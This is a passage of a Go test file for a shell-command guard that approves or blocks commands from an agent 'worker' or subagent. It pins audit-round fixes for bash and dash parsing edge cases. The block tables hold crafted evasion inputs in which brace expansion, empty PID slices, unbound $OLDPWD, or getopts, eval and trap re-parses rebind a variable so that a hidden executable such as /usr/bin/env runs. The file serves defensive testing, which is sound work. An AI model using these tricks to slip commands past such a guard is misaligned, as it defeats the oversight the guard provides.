		// Bash expands {'%n',TAR_OPTIONS} — the brace text spans a quoting
		// boundary — into TWO words, so the per-literal scan alone can
		// never suffice: the word-level copy walk must catch it.
		w := parseBashSingleCmdWord(t, `printf {'%n',TAR_OPTIONS}`, 1)
		s, static := wordToArg(w)
		if static {
			t.Fatalf("wordToArg({'%%n',TAR_OPTIONS}) = (%q, true), want static=false", s)
		}
	})

	// ---- R14-M2: unbound "$OLDPWD" never granted the abs-dq class ----
	t.Run("R14-M2 unbound OLDPWD placeholder can collapse empty", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `printf "%s" "$OLDPWD"`, 2)
		dq, ok := w.Parts[0].(*syntax.DblQuoted)
		if !ok || len(dq.Parts) != 1 {
			t.Fatalf("parse: word shape %T/%d parts, want one DblQuoted/one part", w.Parts[0], len(w.Parts))
		}
		pe, ok := dq.Parts[0].(*syntax.ParamExp)
		if !ok {
			t.Fatalf("parse: dq part is %T, want *syntax.ParamExp", dq.Parts[0])
		}
		s, staticText := blankSubCollector().dqParamPlaceholder(pe)
		if staticText {
			t.Fatalf("dqParamPlaceholder($OLDPWD) = (%q, true), want ok=false (unbound OLDPWD is dynamic)", s)
		}
		if dynGluedTailNonEmpty(s) {
			t.Fatalf("dynGluedTailNonEmpty(%q) = true, want false (OLDPWD can be empty when never inherited)", s)
		}
		if !dynWordCanSpellDashDash("--" + s) {
			t.Fatalf("dynWordCanSpellDashDash(--%q) = false, want true (an empty OLDPWD spells exactly '--')", s)
		}
	})
	t.Run("R14-M2-pos PWD keeps the abs-dq class", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `printf "%s" "$PWD"`, 2)
		dq := w.Parts[0].(*syntax.DblQuoted)
		pe := dq.Parts[0].(*syntax.ParamExp)
		s, _ := blankSubCollector().dqParamPlaceholder(pe)
		if s != cmdSubPlaceholderAbsDq {
			t.Fatalf("dqParamPlaceholder($PWD) = %q, want the abs-dq placeholder (bash always populates PWD)", s)
		}
	})

	// ---- R14-M3: derived $$ operators are not raw PID digits ----
	t.Run("R14-M3 sliced PID can spell dashdash in both encoders", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `printf "%s" "--${$:0:0}"`, 2)
		s1, st1 := wordToArg(w)
		if st1 {
			t.Fatalf("wordToArg(\"--${$:0:0}\") is static, want dynamic")
		}
		if !dynWordCanSpellDashDash(s1) {
			t.Fatalf("dynWordCanSpellDashDash(wordToArg) = false for %q, want true (a zero-length slice expands EMPTY)", s1)
		}
		s2, st2 := blankSubCollector().wordToArg(w)
		if st2 {
			t.Fatalf("subCollector.wordToArg(\"--${$:0:0}\") is static, want dynamic")
		}
		if !dynWordCanSpellDashDash(s2) {
			t.Fatalf("dynWordCanSpellDashDash(subCollector.wordToArg) = false for %q, want true", s2)
		}
	})
	t.Run("R14-M3-pos bare PID never spells dashdash", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `printf "%s" "$$"`, 2)
		s1, _ := wordToArg(w)
		if dynWordCanSpellDashDash(s1) {
			t.Fatalf("dynWordCanSpellDashDash(wordToArg bare $$) = true for %q, want false (PID digits)", s1)
		}
		s2, _ := blankSubCollector().wordToArg(w)
		if dynWordCanSpellDashDash(s2) {
			t.Fatalf("dynWordCanSpellDashDash(subCollector bare $$) = true for %q, want false", s2)
		}
	})
	t.Run("R14-M3 preScanVarMutations counts getopts standby slot", func(t *testing.T) {
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		f, err := p.Parse(strings.NewReader(`getopts "--${$:0:0}" first second`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		writes, allTainted := preScanVarMutations(f)
		if allTainted {
			t.Fatal("preScanVarMutations(getopts sliced-PID optstring): allTainted = true, want false")
		}
		if writes["second"] < 1 {
			t.Fatalf("preScanVarMutations: writes[second] = %d, want >= 1 (the sliced PID can expand to exactly '--', vetting the standby NAME slot)", writes["second"])
		}
	})

	// ---- R14-S1: explicit-path printf exempt in the AST pre-scan ----
	t.Run("R14-S1 preScanVarMutations usr bin printf no taint", func(t *testing.T) {
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		f, err := p.Parse(strings.NewReader(`/usr/bin/printf "label=$LABEL %s" value`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		_, allTainted := preScanVarMutations(f)
		if allTainted {
			t.Fatal("preScanVarMutations(/usr/bin/printf ...): allTainted = true, want false (an external child process cannot write shell variables)")
		}
	})

	// ---- R14-S2: zero-argument printf pure-tilde exemption ----
	t.Run("R14-S2 printfFmtWriteSlots pure tilde fmt is safe", func(t *testing.T) {
		if _, dyn := printfFmtWriteSlots("~/banner"+cmdSubPlaceholderGlob, nil); dyn {
			t.Fatal("printfFmtWriteSlots(~/banner+glob, nil): dyn = true, want false (tilde expansion yields exactly ONE path word)")
		}
	})
	t.Run("R14-S2 glob and brace fmt stay dyn", func(t *testing.T) {
		if _, dyn := printfFmtWriteSlots("~/banner*"+cmdSubPlaceholderGlob, nil); !dyn {
			t.Fatal("printfFmtWriteSlots(~/banner*+glob, nil): dyn = false, want true (real glob metacharacter)")
		}
		if _, dyn := printfFmtWriteSlots("lit*"+cmdSubPlaceholderGlob, nil); !dyn {
			t.Fatal("printfFmtWriteSlots(lit*+glob, nil): dyn = false, want true")
		}
		w := parseBashSingleCmdWord(t, `printf tag{red,blue}`, 1)
		s, _ := wordToArg(w)
		if _, dyn := printfFmtWriteSlots(s, nil); !dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = false, want true (brace expansion multiplies the word)", s)
		}
	})

	// ---- R14-S3: awk --source= explicit empty program ----
	t.Run("R14-S3 awkProgramFrags empty source parity", func(t *testing.T) {
		F := cmdSubPlaceholderQuoted
		prog1, sf1, hit1 := awkProgramFrags([]string{"--source=", "--", F})
		prog2, sf2, hit2 := awkProgramFrags([]string{"-e", "", "--", F})
		if hit1 != "" || hit2 != "" {
			t.Fatalf("awkProgramFrags hits = (%q, %q), want both empty (the post-`--` word is input data once a program source exists)", hit1, hit2)
		}
		if prog1 != prog2 || sf1 != sf2 {
			t.Fatalf("awkProgramFrags(--source=) = (%q,%v) vs (-e '') = (%q,%v), want identical", prog1, sf1, prog2, sf2)
		}
	})

	// ---- End-to-end guard verdicts ----
	blockCases := []struct {
		name, cmd string
	}{
		// R14-M1: a brace-expanded printf format word becomes MULTIPLE argv
		// words inside bash — match[0] is the real format string, match[1]
		// the first write-target argument. The zero-argument exemption must
		// not apply.
		{"P-R14-M1-a printf brace fmt script", `bash -c 'printf tag{red,blue}'`},
		{"P-R14-M1-b printf brace fmt script args", `bash -c 'printf a{b,c} x'`},
		// R14-M2: an UNBOUND "$OLDPWD" can expand EMPTY at runtime, so the
		// glued read prompt tail can collapse and swallow the next argv
		// word — the pre-scan must fail closed instead of trusting the
		// absolute-dir placeholder class.
		{"P-R14-M2-a read empty-able OLDPWD prompt in script", `bash -c 'cmd=/bin/true; read -p"$OLDPWD" answer <<< ok; "$cmd"'`},
		// R14-M3: a zero-length ${$:0:0} slice can expand EMPTY, spelling
		// the getopts terminator and shifting the standby write target onto
		// `second` — the pre-scan must count that write.
		{"P-R14-M3-a getopts sliced PID in script", `bash -c 'second=/usr/bin/env; getopts "--${$:0:0}" first second; "$second"'`},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
		})
	}
	allowCases := []struct {
		name, cmd string
	}{
		// R16-Oracle-S3: the row duplicating R13's external-printf
		// combination script verbatim (`bash -c 'cmd=/bin/true;
		// /usr/bin/printf "label=$LABEL %s" value; "$cmd"'` — the exact cmd
		// of R13's R13-SF3-script row) is REMOVED, not duplicated: two
		// byte-identical rows can never count as two independent behavior
		// evidences. The table is now exactly 6 rows with a zero cmd
		// intersection against R13's allowCases.
		// R14-S2: pure-tilde zero-argument printf format words expand to
		// exactly one path word — nothing can be written without arguments.
		{"R14-S2-pos printf tilde fmt", `printf ~/banner`},
		{"R14-S2-pos printf tilde fmt script", `bash -c 'printf ~/banner'`},
		// R14-S3: an explicitly empty awk program with input data after the
		// terminator is inert.
		{"R14-S3-pos gawk empty source data file", `gawk --source= -- "$F"`},
		// R14-M1-pos: quoting suppresses brace expansion entirely.
		{"R14-M1-pos printf quoted brace fmt", `bash -c 'printf '\''a{b,c}'\'''`},
		// R14-M2-pos: a SEPARATE double-quoted prompt operand stays exactly
		// one argv word even when empty — no glued-tail collapse is
		// possible — so the unbound-OLDPWD tightening must not refuse it.
		{"R14-M2-pos read separate OLDPWD prompt in script", `bash -c 'cmd=/bin/true; read -p "$OLDPWD" answer <<< ok; "$cmd"'`},
		// R14-S2-pos combo-script variant (R15-Oracle-S4: replaces the row
		// that duplicated R13's `bash -c` external-printf combination
		// script verbatim — two identical rows cannot count as two
		// independent behavior evidences). This is the combination-script
		// counterpart of the pure-tilde printf exemption: the tilde format
		// word inside `bash -c` must not all-taint the write pre-scan, so
		// `cmd` keeps its static bind.
		{"R14-S2-pos printf tilde fmt combo script", `bash -c 'cmd=/bin/true; printf ~/banner; "$cmd"'`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// TestGuard_V622_OracleR15Probes pins the Oracle R15 audit closure:
// brace-expansion words never pass the merged path-prefix/slash review
// of isSafeDynamicDataOperand (R15-M1), the non-empty absolute-path
// grants of `"$(mktemp -d)"` and `"$HOME"` require an actually inherited
// valid TMPDIR/HOME (R15-M2), quoted literal braces keep the pure-tilde
// single-path exemption while the POSIX/dash top-level dialect performs
// no brace expansion (R15-S1), awk distinguishes an explicitly empty
// positional program from a not-yet-provided one (R15-S2) and nested
// separator-less literal braces are rejected by the single-pass budget
// scan without any SplitBraces replay (R15-S3). Pure-function pins
// reference only production symbols that exist verbatim on the pre-fix
// tree c02027c (the consumer predicates and parsers), so the
// discriminating rows reproduce FAIL directly there; rows whose verdict
// is unchanged by the bounded-cost rewrite are marked as invariant
// controls.
func TestGuard_V622_OracleR15Probes(t *testing.T) {
	// ---- R15-M1: brace words never pass isSafeDynamicDataOperand ----
	t.Run("R15-M1 context-free encoding brace word unsafe operand", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo {docs/a,-blue}`, 1)
		s, static := wordToArg(w)
		if static {
			t.Fatalf("wordToArg({docs/a,-blue}) = (%q, true), want static=false", s)
		}
		if !strings.Contains(s, cmdSubPlaceholderGlob) || !strings.Contains(s, "{") {
			t.Fatalf("wordToArg({docs/a,-blue}) = %q, want the brace-list glob encoding", s)
		}
		if isSafeDynamicDataOperand(s) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false — the '/' of docs/a says nothing about the sibling '-blue' branch expanding to an option spelling", s)
		}
	})
	t.Run("R15-M1 collector encoding brace word unsafe operand", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo {docs/a,-blue}`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg({docs/a,-blue}) = (%q, true), want static=false", s)
		}
		if isSafeDynamicDataOperand(s) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false (collector encoding)", s)
		}
	})
	t.Run("R15-M1-pos ordinary path glob stays a safe operand", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `cat docs/*.txt`, 1)
		s, static := wordToArg(w)
		if static {
			t.Fatalf("wordToArg(docs/*.txt) = (%q, true), want dynamic", s)
		}
		if !isSafeDynamicDataOperand(s) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = false, want true — a plain pathname glob carries no '{' brace byte and keeps its data-operand grant", s)
		}
	})

	// ---- R15-M2: failing $(mktemp -d) and empty $HOME lose the grant ----
	t.Run("R15-M2 mktemp invalid TMPDIR encoding can collapse empty", func(t *testing.T) {
		// TMPDIR pointing at a regular file makes GNU mktemp fail: the
		// diagnostic goes to stderr and stdout inside the double quotes is
		// EMPTY, so the substitution must never carry the absolute-dir
		// class here (pure parse probe — no child process runs).
		t.Setenv("TMPDIR", "/dev/null")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg(\"$(mktemp -d)\") under TMPDIR=/dev/null is static, want dynamic")
		}
		if strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q carries the abs-dq class, want the ordinary quoted placeholder (mktemp can fail empty under TMPDIR=/dev/null)", s)
		}
		if dynGluedTailNonEmpty(s) {
			t.Fatalf("dynGluedTailNonEmpty(%q) = true, want false", s)
		}
		if !dynWordCanSpellDashDash("--" + s) {
			t.Fatalf("dynWordCanSpellDashDash(--%q) = false, want true (an empty substitution spells exactly '--')", s)
		}
	})
	t.Run("R15-M2-pos mktemp valid TMPDIR keeps the abs-dq class", func(t *testing.T) {
		// An unset TMPDIR makes mktemp use its /tmp default — the success
		// grant must survive (control row for the tightened gate).
		t.Setenv("TMPDIR", "")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		if !strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q lost the abs-dq class under a valid inherited TMPDIR, want it kept", s)
		}
		if dynWordCanSpellDashDash("--" + s) {
			t.Fatalf("dynWordCanSpellDashDash(--%q) = true, want false (a successful mktemp -d is a non-empty absolute path)", s)
		}
	})
	t.Run("R15-M2 empty inherited HOME is not a static /root", func(t *testing.T) {
		t.Setenv("HOME", "")
		w := parseBashSingleCmdWord(t, `echo "$HOME"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg(\"$HOME\") under HOME=\"\" = (%q, true), want dynamic — childEnv copies keys verbatim and never re-populates HOME, so the expansion is EMPTY", s)
		}
		if strings.Contains(s, "/root") {
			t.Fatalf("encoding %q contains the fabricated /root fallback, want the plain quoted placeholder", s)
		}
		if dynGluedTailNonEmpty(s) {
			t.Fatalf("dynGluedTailNonEmpty(%q) = true, want false", s)
		}
		if !dynWordCanSpellDashDash("--" + s) {
			t.Fatalf("dynWordCanSpellDashDash(--%q) = false, want true (an empty HOME spells exactly '--')", s)
		}
	})
	t.Run("R15-M2-pos valid inherited HOME keeps the static abs path", func(t *testing.T) {
		t.Setenv("HOME", "/root")
		w := parseBashSingleCmdWord(t, `echo "$HOME"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if !static || s != "/root" {
			t.Fatalf("subCollector.wordToArg(\"$HOME\") under HOME=/root = (%q, %v), want (/root, true)", s, static)
		}
	})

	// ---- R15-S1: quoted literal braces and the dash dialect ----
	t.Run("R15-S1 quoted tilde brace literal is single-word safe", func(t *testing.T) {
		// `~/'{red,blue}'`: the braces are SINGLE-QUOTED literal text —
		// bash expands only the tilde, so the runtime result is exactly
		// ONE path word. wordBraceExpHit must not fire on the quoted
		// braces, and the encoding carries exactly one glob placeholder
		// (from the tilde) with '{' only AFTER the placeholder marker, so
		// the pure-tilde exemption applies again.
		w := parseBashSingleCmdWord(t, `echo ~/'{red,blue}'`, 1)
		if wordBraceExpHit(w) {
			t.Fatal("wordBraceExpHit(~/'{red,blue}') = true, want false (quoted braces never expand)")
		}
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg(~/'{red,blue}') = (%q, true), want dynamic (the tilde is expansion)", s)
		}
		if _, dyn := printfFmtWriteSlots(s, nil); dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = true, want false — tilde expansion yields exactly ONE path word even with quoted literal brace bytes", s)
		}
	})
	t.Run("R15-S1-pos unquoted tilde brace still multiplies words", func(t *testing.T) {
		// `~/{red,blue}` DOES brace-expand into multiple path words: the
		// tilde glob placeholder plus the brace hit's own marker make TWO
		// glob placeholders, denying the single-word exemption.
		w := parseBashSingleCmdWord(t, `echo ~/{red,blue}`, 1)
		if !wordBraceExpHit(w) {
			t.Fatal("wordBraceExpHit(~/{red,blue}) = false, want true")
		}
		s, _ := blankSubCollector().wordToArg(w)
		// R18-Oracle-M4: the NUL-provenanced tilde marker is pure
		// provenance evidence, not a glob byte — the exactly-two-glob
		// brace expansion shape is judged after stripping it.
		// R19-Oracle-S3: the NUL-provenanced tilde marker is referenced as
		// its LITERAL bytes so this test file compiles verbatim on the
		// pre-fix parent trees (which do not yet define the constant).
		stripped := strings.ReplaceAll(s, "\x00__ctx_tilde__\x00", "")
		if strings.Count(stripped, cmdSubPlaceholderGlob) != 2 {
			t.Fatalf("subCollector.wordToArg(~/{red,blue}) = %q, want exactly 2 glob placeholders (tilde + brace, after stripping the NUL tilde marker)", s)
		}
		if _, dyn := printfFmtWriteSlots(s, nil); !dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = false, want true", s)
		}
	})

	// ---- R15-S2: awk empty positional program vs absent program ----
	t.Run("R15-S2 awk empty positional program parity", func(t *testing.T) {
		F := cmdSubPlaceholderQuoted
		prog1, sf1, hit1 := awkProgramFrags([]string{"--", "", F})
		prog2, sf2, hit2 := awkProgramFrags([]string{"-e", "", "--", F})
		if hit1 != "" || hit2 != "" {
			t.Fatalf("awkProgramFrags hits = (%q, %q), want both empty — an explicitly EMPTY positional program already supplies awk's program text, so the post-`--` word is input data exactly like after `-e ''`", hit1, hit2)
		}
		if prog1 != "" || prog2 != "" || sf1 || sf2 {
			t.Fatalf("awkProgramFrags = (%q,%v) / (%q,%v), want (\"\",false) for both", prog1, sf1, prog2, sf2)
		}
	})

	// ---- R15-S3: nested separator-less braces rejected in one pass ----
	t.Run("R15-S3 nested literal braces never reach SplitBraces", func(t *testing.T) {
		// INVARIANT-CONTROL rows: the verdict was false on the pre-fix
		// tree too — the change is the COST model (the former recursive
		// replay copied already-restored inner Parts at every level,
		// quadratic in depth; the single-pass budget scan performs zero
		// WordPart copies for separator-less shapes). These rows pin the
		// verdict so the bounded-cost rewrite cannot regress correctness.
		for _, depth := range []int{4, 8} {
			word := strings.Repeat("{", depth) + "a" + strings.Repeat("}", depth)
			w := parseBashSingleCmdWord(t, `echo `+word, 1)
			if wordBraceExpHit(w) {
				t.Fatalf("wordBraceExpHit(%s) = true, want false (no ',' or '..' separator — bash never expands it)", word)
			}
			s, static := wordToArg(w)
			if !static || s != word {
				t.Fatalf("wordToArg(%s) = (%q, %v), want the static literal", word, s, static)
			}
			s2, static2 := blankSubCollector().wordToArg(w)
			if !static2 || s2 != word {
				t.Fatalf("subCollector.wordToArg(%s) = (%q, %v), want the static literal", word, s2, static2)
			}
		}
	})

	// ---- End-to-end guard verdicts ----
	blockCases := []struct {
		name, cmd, want string
	}{
		// R15-S1 control: bash really performs brace expansion, so the
		// explicit `bash -c` spelling keeps blocking exactly like R14.
		{"P-R15-S1-b bash printf brace fmt", `bash -c 'printf tag{red,blue}'`, "env dynamic printf"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}
	allowCases := []struct {
		name, cmd string
	}{
		// R15-S1-b: /bin/sh is dash on this topology — dash performs NO
		// brace expansion, so `printf tag{red,blue}` arrives as exactly
		// ONE literal format word with no '%' conversions and no arguments.
		{"P-R15-S1-b-pos dash printf literal brace fmt", `printf tag{red,blue}`},
		// R15-S1-a: the single-quoted tilde-brace word is exactly one path
		// word after tilde expansion — the pure-tilde exemption restored.
		{"P-R15-S1-a-pos printf quoted tilde brace fmt", `printf ~/'{red,blue}'`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// TestGuard_V622_OracleR16Probes pins the Oracle R16 audit closure:
// the mktemp directory proof covers pseudo filesystems AND the
// variable-assignment binding path (R16-M1), a bash-family interpreter's
// eval/trap/stdin re-parses keep the bash dialect instead of falling back
// to dash (R16-M2), unquoted $HOME with whitespace or glob bytes is never
// a single static operand (R16-M3), ~/... path restoration uses the
// shell-visible inherited HOME rather than the config-search fallback
// (R16-M4), a quoted literal brace inside an ordinary pathname glob stays
// a safe data operand (R16-S1), the AST write pre-scan is dialect-aware
// for dash (R16-S2) and the R14 allow table is mechanically deduplicated
// to 6 rows with a zero cmd intersection against R13 (R16-S3).
// Pure-function pins reference only production symbols that exist verbatim
// on the pre-fix tree d3efa30 (the consumer predicates, parsers and the
// unchanged preScanVarMutations one-argument call shape), so the
// discriminating rows reproduce FAIL directly there; rows marked
// post-fix-only exercise the new dialect plumbing that cannot exist on
// the pre-fix tree.
func TestGuard_V622_OracleR16Probes(t *testing.T) {
	// ---- R16-M1: mktemp TMPDIR validity proof ----
	t.Run("R16-M1-a TMPDIR proc loses the abs-dq grant", func(t *testing.T) {
		// /proc is a real directory (mode 0555) but a pseudo filesystem on
		// which mktemp can never create a subdirectory — the encoding must
		// never carry the non-empty absolute-dir class here.
		t.Setenv("TMPDIR", "/proc")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg(\"$(mktemp -d)\") under TMPDIR=/proc is static, want dynamic")
		}
		if strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q carries the abs-dq class, want the ordinary quoted placeholder (mktemp can fail empty under TMPDIR=/proc)", s)
		}
		if dynGluedTailNonEmpty(s) {
			t.Fatalf("dynGluedTailNonEmpty(%q) = true, want false", s)
		}
		if !dynWordCanSpellDashDash("--" + s) {
			t.Fatalf("dynWordCanSpellDashDash(--%q) = false, want true (an empty substitution spells exactly '--')", s)
		}
	})
	t.Run("R16-M1-a-pos TMPDIR unset keeps the abs-dq grant", func(t *testing.T) {
		t.Setenv("TMPDIR", "")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		if !strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q lost the abs-dq class under an unset TMPDIR, want it kept", s)
		}
	})
	t.Run("R16-M1-b assignment binding requires a valid TMPDIR", func(t *testing.T) {
		// staticAssignVal is the variable-binding producer feeding the SAME
		// downstream positional-layout proofs: TMPDIR=/dev/null must not
		// mint the non-empty mktemp directory bind there either.
		for _, td := range []string{"/dev/null", "/proc"} {
			t.Run(strings.ReplaceAll(td, "/", "_"), func(t *testing.T) {
				t.Setenv("TMPDIR", td)
				p := syntax.NewParser(syntax.Variant(syntax.LangBash))
				f, err := p.Parse(strings.NewReader(`d=$(mktemp -d)`), "")
				if err != nil {
					t.Fatalf("parse: %v", err)
				}
				call, ok := f.Stmts[0].Cmd.(*syntax.CallExpr)
				if !ok || len(call.Assigns) != 1 || call.Assigns[0].Value == nil {
					t.Fatalf("parse shape %T, want one Assign with a value", f.Stmts[0].Cmd)
				}
				v, ok := blankSubCollector().staticAssignVal(call.Assigns[0].Value)
				if ok && v == mktempDirPlaceholder {
					t.Fatalf("staticAssignVal($(mktemp -d)) under TMPDIR=%s = (%q, true), want the mktemp-dir grant withheld — mktemp fails empty there", td, v)
				}
			})
		}
	})
	t.Run("R16-M1-b-pos assignment binding keeps the grant when TMPDIR is unset", func(t *testing.T) {
		t.Setenv("TMPDIR", "")
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		f, err := p.Parse(strings.NewReader(`d=$(mktemp -d)`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		call := f.Stmts[0].Cmd.(*syntax.CallExpr)
		v, ok := blankSubCollector().staticAssignVal(call.Assigns[0].Value)
		if !ok || v != mktempDirPlaceholder {
			t.Fatalf("staticAssignVal($(mktemp -d)) under an unset TMPDIR = (%q, %v), want (%q, true)", v, ok, mktempDirPlaceholder)
		}
	})

	// ---- R16-M2: bash stdin / eval / trap keep the bash dialect ----
	t.Run("R16-M2-c bash -c blocks the brace format (control)", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-M2-c", role: "worker", cmd: `bash -c 'printf tag{red,blue}'`}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash -c path = %q, want substring %q", got, "env dynamic printf")
		}
	})
	t.Run("R16-M2-s bash stdin faces the same bash dialect", func(t *testing.T) {
		// The SAME interpreter reading the SAME program text — only the
		// input channel differs. A dash re-parse judges the brace word a
		// static literal (zero-argument exemption, ALLOW); bash really
		// multiplies it, so the stdin path must agree with the -c path.
		got := rtGuardCwd(t, rtCase{id: "R16-M2-s", role: "worker", argv: []string{"bash"}, stdin: "printf tag{red,blue}\n"}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash stdin path = %q, want substring %q — same interpreter, same program, same verdict as bash -c", got, "env dynamic printf")
		}
	})
	t.Run("R16-M2-s2 bash stdin prepare faces the bash dialect", func(t *testing.T) {
		prep := guardCall{subagent: true}.prepareCtxRunArgv([]string{"bash"}, "printf tag{red,blue}\n")
		if prep.rule == "" {
			t.Fatalf("prepareCtxRunArgv(bash + brace stdin) passed, want the bash-dialect guard block")
		}
	})
	t.Run("R16-M2-s-pos dash stdin keeps the POSIX literal", func(t *testing.T) {
		// /bin/sh is dash on this topology: dash performs NO brace
		// expansion, so the zero-argument literal format word stays ALLOW —
		// the compatibility half of the dialect split.
		got := rtGuardCwd(t, rtCase{id: "R16-M2-s-pos", role: "worker", argv: []string{"sh"}, stdin: "printf tag{red,blue}\n"}, "")
		if got != "ALLOW" {
			t.Fatalf("dash stdin path = %q, want ALLOW", got)
		}
	})
	t.Run("R16-M2-eval re-parse inherits the bash dialect", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-M2-eval", role: "worker", cmd: `bash -c 'eval "printf tag{red,blue}"'`}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash eval path = %q, want substring %q", got, "env dynamic printf")
		}
	})
	t.Run("R16-M2-eval-pos dash eval keeps the POSIX literal", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-M2-eval-pos", role: "worker", cmd: `eval "printf tag{red,blue}"`}, "")
		if got != "ALLOW" {
			t.Fatalf("dash eval path = %q, want ALLOW", got)
		}
	})
	t.Run("R16-M2-trap action inherits the bash dialect", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-M2-trap", role: "worker", cmd: `bash -c 'trap "printf tag{red,blue}" EXIT'`}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash trap path = %q, want substring %q", got, "env dynamic printf")
		}
	})
	t.Run("R16-M2-trap-pos dash trap keeps the POSIX literal", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-M2-trap-pos", role: "worker", cmd: `trap "printf tag{red,blue}" EXIT`}, "")
		if got != "ALLOW" {
			t.Fatalf("dash trap path = %q, want ALLOW", got)
		}
	})

	// ---- R16-M3: unquoted $HOME with whitespace/globs is never one word ----
	t.Run("R16-M3 unquoted HOME with whitespace is not a single operand", func(t *testing.T) {
		t.Setenv("HOME", "/home/Team Blue")
		w := parseBashSingleCmdWord(t, `echo $HOME`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg($HOME) under HOME=/home/Team Blue = (%q, true), want dynamic — the expansion field-splits at runtime", s)
		}
		if isSingleWordOptionValue(s) {
			t.Fatalf("isSingleWordOptionValue(%q) = true, want false — HOME=\"/home/Team Blue\" splits into two fields unquoted", s)
		}
	})
	t.Run("R16-M3-pos quoted HOME stays one operand slot", func(t *testing.T) {
		t.Setenv("HOME", "/home/Team Blue")
		w := parseBashSingleCmdWord(t, `echo "$HOME"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if !static {
			t.Fatalf("subCollector.wordToArg(\"$HOME\") = (%q, false), want the static literal — double quotes suppress field splitting entirely", s)
		}
		if !isSingleWordOptionValue(s) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true (a double-quoted expansion is exactly one argv word)", s)
		}
	})
	t.Run("R16-M3 unquoted HOME with glob bytes is not a single operand", func(t *testing.T) {
		t.Setenv("HOME", "/home/te*am")
		w := parseBashSingleCmdWord(t, `echo $HOME`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg($HOME) under HOME=/home/te*am = (%q, true), want dynamic — pathname expansion can multiply the word", s)
		}
		if isSingleWordOptionValue(s) {
			t.Fatalf("isSingleWordOptionValue(%q) = true, want false", s)
		}
	})
	t.Run("R16-M3-pos clean unquoted HOME keeps the literal grant", func(t *testing.T) {
		// INVARIANT-CONTROL row: an unquoted $HOME never encodes as a static
		// word on either tree (the collector always marks unquoted expansions
		// dynamic) — but a whitespace/glob-free absolute HOME keeps the
		// literal path TEXT, which is single-word-safe as an option value.
		t.Setenv("HOME", "/root")
		w := parseBashSingleCmdWord(t, `echo $HOME`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static || s != "/root" {
